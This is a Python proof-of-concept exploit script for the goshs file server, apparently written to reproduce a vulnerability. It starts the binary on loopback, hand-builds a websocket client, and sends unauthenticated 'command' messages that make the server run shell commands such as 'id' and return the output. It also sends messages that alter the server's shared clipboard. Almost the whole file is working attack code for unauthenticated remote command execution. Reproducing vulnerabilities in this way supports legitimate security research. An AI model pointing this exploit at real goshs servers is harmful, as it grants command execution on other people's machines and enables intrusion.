#!/usr/bin/env python3
"""PoC: unauthenticated server-side action via goshs realtime websocket channel.

Starts the target goshs binary on loopback, connects to the browser-sync
websocket endpoint at /?ws and sends JSON client messages. A message of type
"command" makes the server execute the supplied shell command server-side and
broadcast the command output back to all connected websocket clients
(message type "updateCLI"). Clipboard message types ("newEntry",
"clearClipboard") make the server mutate its shared clipboard state and
broadcast "refreshClipboard".

Emits a JSON result object with the full protocol transcript.
Standard library only.
"""

import argparse
import base64
import hashlib
import json
import os
import shutil
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.request

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
MAX_CAPTURE = 65536


class WSClient:
    """Minimal RFC6455 client (stdlib only)."""

    def __init__(self, host, port, path, timeout):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        request = (
            "GET {path} HTTP/1.1\r\n"
            "Host: {host}:{port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        ).format(path=path, host=host, port=port, key=key)
        self.sock.sendall(request.encode("ascii"))
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise ConnectionError("connection closed during websocket upgrade")
            buf += chunk
        head, self.buf = buf.split(b"\r\n\r\n", 1)
        status_line = head.split(b"\r\n", 1)[0].decode("latin-1")
        if " 101 " not in status_line and not status_line.endswith(" 101"):
            raise ConnectionError("websocket upgrade failed: " + status_line)
        headers = {}
        for line in head.split(b"\r\n")[1:]:
            if b":" in line:
                name, value = line.split(b":", 1)
                headers[name.strip().lower()] = value.strip()
        expect = base64.b64encode(
            hashlib.sha1((key + WS_GUID).encode("ascii")).digest()
        )
        if headers.get(b"sec-websocket-accept", b"") != expect:
            raise ConnectionError("websocket upgrade failed: bad Sec-WebSocket-Accept")

    def send_text(self, text):
        payload = text.encode("utf-8")
        header = bytearray([0x81])
        length = len(payload)
        if length < 126:
            header.append(0x80 | length)
        elif length < 65536:
            header.append(0x80 | 126)
            header += struct.pack(">H", length)
        else:
            header.append(0x80 | 127)
            header += struct.pack(">Q", length)
        mask = os.urandom(4)
        header += mask
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(bytes(header) + masked)

    def _send_pong(self, payload):
        mask = os.urandom(4)
        length = len(payload)
        header = bytearray([0x8A, 0x80 | length])
        header += mask
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(bytes(header) + masked)

    def recv_message(self, timeout):
        """Return one complete text/binary message, or None on timeout/close."""
        deadline = time.monotonic() + timeout
        message = bytearray()
        while True:
            frame = self._read_frame(deadline)
            if frame is None:
                return None
            fin, opcode, payload = frame
            if opcode == 0x9:  # ping
                self._send_pong(payload)
                continue
            if opcode == 0x8:  # close
                return None
            if opcode in (0x1, 0x2, 0x0):
                message += payload
                if fin:
                    return bytes(message)

    def _read_frame(self, deadline):
        while True:
            parsed = self._try_parse()
            if parsed is not None:
                return parsed
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                return None
            self.sock.settimeout(remaining)
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                return None
            if not chunk:
                return None
            self.buf += chunk

    def _try_parse(self):
        buf = self.buf
        if len(buf) < 2:
            return None
        fin = bool(buf[0] & 0x80)
        opcode = buf[0] & 0x0F
        length = buf[1] & 0x7F
        idx = 2
        if length == 126:
            if len(buf) < 4:
                return None
            length = struct.unpack(">H", buf[2:4])[0]
            idx = 4
        elif length == 127:
            if len(buf) < 10:
                return None
            length = struct.unpack(">Q", buf[2:10])[0]
            idx = 10
        if len(buf) < idx + length:
            return None
        payload = buf[idx:idx + length]
        self.buf = buf[idx + length:]
        return fin, opcode, payload

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def free_port():
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    probe.bind(("127.0.0.1", 0))
    port = probe.getsockname()[1]
    probe.close()
    return port


def wait_for_http(port, deadline):
    url = "http://127.0.0.1:{}/".format(port)
    while time.monotonic() < deadline:
        try:
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, timeout=2) as resp:
                resp.read(1)
            return True
        except Exception:
            time.sleep(0.1)
    return False


def build_probe_messages():
    """Dynamically construct the trigger inputs for this run."""
    return [
        {"type": "command", "content": "id"},
        {"type": "newEntry", "content": "poc-clipboard-probe-entry"},
        {"type": "clearClipboard", "content": ""},
    ]


def main():
    parser = argparse.ArgumentParser(
        description="PoC: trigger a security-relevant server-side action via "
                    "the goshs realtime websocket channel."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None,
                        help="write JSON result to this file instead of stdout")
    parser.add_argument("--timeout", type=float, default=25.0,
                        help="per-run timeout in seconds (default 25)")
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    start = time.monotonic()
    deadline = start + args.timeout

    result = {
        "binary": binary,
        "command": [],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {"kind": "protocol_transcript", "value": "", "path": None},
        "error": None,
    }

    transcript = []
    proc = None
    webroot = None

    try:
        if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
            raise FileNotFoundError("target binary not found or not executable: " + binary)

        port = free_port()
        webroot = tempfile.mkdtemp(prefix="goshs-poc-webroot-")
        cmd = [binary, "-i", "127.0.0.1", "-p", str(port), "-d", webroot]
        result["command"] = cmd

        env = dict(os.environ)
        env["HTTP_PROXY"] = "http://127.0.0.1:9"
        env["HTTPS_PROXY"] = "http://127.0.0.1:9"

        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            cwd=webroot,
        )

        if not wait_for_http(port, deadline):
            if proc.poll() is not None:
                raise RuntimeError(
                    "target exited during startup (rc={})".format(proc.returncode))
            result["timed_out"] = True
            raise RuntimeError("target did not start serving HTTP before timeout")

        ws = WSClient("127.0.0.1", port, "/?ws", timeout=max(1.0, deadline - time.monotonic()))
        try:
            for message in build_probe_messages():
                line = json.dumps(message, separators=(",", ":"))
                ws.send_text(line)
                transcript.append("C> " + line)
                # Collect every server message broadcast in response, until
                # the channel goes quiet or the run deadline is hit.
                while True:
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        result["timed_out"] = True
                        break
                    received = ws.recv_message(min(1.5, remaining))
                    if received is None:
                        break
                    try:
                        text = received.decode("utf-8")
                    except UnicodeDecodeError:
                        text = received.decode("utf-8", errors="replace")
                    transcript.append("S< " + text)
                if result["timed_out"]:
                    break
        finally:
            ws.close()

        if result["timed_out"] and not transcript:
            raise RuntimeError("run timed out before any interaction was recorded")

    except Exception as exc:  # script-level execution failure only
        result["error"] = "{}: {}".format(type(exc).__name__, exc)
    finally:
        if proc is not None:
            try:
                if proc.poll() is None:
                    proc.send_signal(signal.SIGINT)
                    try:
                        proc.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        proc.kill()
                        proc.wait(timeout=5)
                out, err = proc.communicate()
                result["stdout"] = out.decode("utf-8", errors="replace")[:MAX_CAPTURE]
                result["stderr"] = err.decode("utf-8", errors="replace")[:MAX_CAPTURE]
                result["returncode"] = proc.returncode
                if proc.returncode is not None and proc.returncode < 0:
                    result["signal"] = -proc.returncode
            except Exception as exc:
                if result["error"] is None:
                    result["error"] = "shutdown failure: {}: {}".format(
                        type(exc).__name__, exc)
        if webroot is not None:
            shutil.rmtree(webroot, ignore_errors=True)

    result["observable"]["value"] = "\n".join(transcript)
    result["runtime_ms"] = int((time.monotonic() - start) * 1000)

    output = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(output + "\n")
    else:
        sys.stdout.write(output + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())
